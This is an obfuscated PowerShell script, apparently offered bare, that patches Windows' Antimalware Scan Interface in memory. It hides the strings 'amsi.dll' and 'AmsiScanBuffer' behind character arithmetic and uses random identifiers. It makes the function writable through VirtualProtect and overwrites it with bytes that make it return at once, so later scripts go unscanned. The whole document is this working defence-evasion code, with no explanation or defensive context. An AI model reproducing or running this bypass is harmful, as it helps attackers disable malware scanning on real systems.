$Il9PyOj5jjfdnGGyMMfc = @"
using System;
using System.Runtime.InteropServices;
public class Il9PyOj5jjfdnGGyMMfc {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr BTOsit4, string WVdBucq0D);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr XiGJYI8P8uQAUkDOjtR, UIntPtr rk5B8iYWB, uint iirP05IBq0OGlY, out uint vxKayJ9oa);
}
"@

Add-Type $Il9PyOj5jjfdnGGyMMfc

$W1ESpeCwvdGvAVvzNOn = [Il9PyOj5jjfdnGGyMMfc]::LoadLibrary("$([cHar]([Byte]0x61)+[char](90+19)+[ChAR](51+64)+[CHAR](14+91)+[chAr]([byte]0x2e)+[chAr](72+28)+[chAr](108*57/57)+[cHar](108+44-44))")
$bQxgGCW0tJ4BzjSduIp = [Il9PyOj5jjfdnGGyMMfc]::GetProcAddress($W1ESpeCwvdGvAVvzNOn, "$([cHaR]([byte]0x41)+[cHAR](109*60/60)+[ChAr](115)+[ChaR]([BYte]0x69)+[ChAr](83)+[CHaR]([byTE]0x63)+[CHaR](97+30-30)+[CHaR](110+72-72)+[chAr]([ByTe]0x42)+[chaR](29+88)+[chAR](102*77/77)+[cHAr](102+87-87)+[Char]([bYte]0x65)+[cHAr](114+99-99))")
$p = 0
[Il9PyOj5jjfdnGGyMMfc]::VirtualProtect($bQxgGCW0tJ4BzjSduIp, [uint32]5, 0x40, [ref]$p)
$wrEzoTH1CJQQRvf2ED2 = "0xB8"
$r9I4 = "0x57"
$CdfY = "0x00"
$PlSOy = "0x07"
$Qjz = "0x80"
$k9cmn6RMEbQAHF9ra0KK = "0xC3"
$VUzcCtGUWTRIch1 = [Byte[]] ($wrEzoTH1CJQQRvf2ED2,$r9I4,$CdfY,$PlSOy,+$Qjz,+$k9cmn6RMEbQAHF9ra0KK)
[System.Runtime.InteropServices.Marshal]::Copy($VUzcCtGUWTRIch1, 0, $bQxgGCW0tJ4BzjSduIp, 6)